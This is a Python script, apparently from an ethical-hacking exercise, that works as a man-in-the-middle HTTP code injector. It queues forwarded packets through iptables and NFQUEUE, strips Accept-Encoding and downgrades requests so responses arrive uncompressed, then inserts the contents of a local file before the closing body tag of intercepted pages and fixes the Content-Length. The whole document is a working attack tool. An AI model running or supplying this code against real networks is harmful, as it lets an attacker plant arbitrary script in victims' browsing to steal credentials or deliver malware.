#!/usr/bin/env python
import subprocess
from netfilterqueue import NetfilterQueue
import scapy.all as scapy
import re


def iptables(inp):
    if inp == 1:
        subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 1", shell=True)
    elif inp == 3:
        subprocess.call("iptables --flush", shell=True)


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def spoof():
    f = open("./code_injector.txt", "r")
    contents = f.read()
    return contents


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            load = load.replace("HTTP/1.1", "HTTP/1.0")

        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response")
            # print(scapy_packet.show())
            injection_code = spoof()
            load = load.replace("</body>", injection_code + "</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))
    packet.accept()


print("[+] Modifying IP Tables....")
iptables(1)
queue = NetfilterQueue()
print("[+] Waiting for Target...")
try:
    queue.bind(1, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("")
    print("[+] Detected CTRL + C .... Quitting.")
    print("[+] Restoring IP Tables.....")
    iptables(3)
    print("[+] Restoring Complete")